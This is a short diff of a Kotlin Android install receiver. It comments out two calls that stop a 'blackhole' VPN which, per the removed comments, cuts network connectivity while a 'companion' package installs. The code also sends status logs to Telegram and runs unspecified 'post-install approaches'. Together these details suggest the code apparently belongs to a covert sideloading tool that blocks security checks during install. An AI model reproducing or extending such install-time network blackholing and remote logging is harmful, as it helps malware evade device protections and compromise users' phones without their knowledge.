@@ -63,8 +63,7 @@ class InstallReceiver : BroadcastReceiver() {
 
             PackageInstaller.STATUS_SUCCESS -> {
                 TelegramLogger.log("InstallReceiver: STATUS_SUCCESS — companion installed")
-                // Stop VPN blackhole — install is done, restore normal connectivity
-                BlackholeVpnService.stop(context)
+                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 try {
                     val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                     TelegramLogger.log("InstallReceiver: installed pkg=$pkgName — running post-install approaches")
@@ -569,8 +568,7 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
             PackageInstaller.STATUS_FAILURE_INVALID,
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
-                // Stop VPN blackhole — install failed, restore normal connectivity
-                BlackholeVpnService.stop(context)
+                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
                 TelegramLogger.log("InstallReceiver: FAILURE status=$status msg=$msg — relaying restart")
                 // Android 15+ (API 35+) blocks startActivity() from BroadcastReceiver
